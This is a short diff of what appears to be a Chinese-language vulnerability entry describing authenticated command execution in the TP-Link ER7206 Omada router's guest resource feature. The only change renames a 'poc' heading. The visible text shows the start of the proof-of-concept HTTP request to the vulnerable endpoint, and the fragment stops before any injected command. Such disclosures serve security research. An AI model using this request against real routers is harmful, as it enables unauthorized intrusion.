@@ -3,7 +3,7 @@
 Tp-Link ER7206 Omada Gigabit VPN Router 1.3.0 build 20230322 Rel.70591 的访客资源功能中存在命令执行漏洞。特制的 HTTP 请求可能导致任意命令执行。攻击者可以发出经过身份验证的 HTTP 请求来触发此漏洞
 
 
-## poc
+## POC
 ```
 POST /cgi-bin/luci/;stok=b53d9dc12fe8aa66f4fdc273e6eaa534/admin/freeStrategy?form=strategy_list HTTP/1.1
 Host: 192.168.8.100
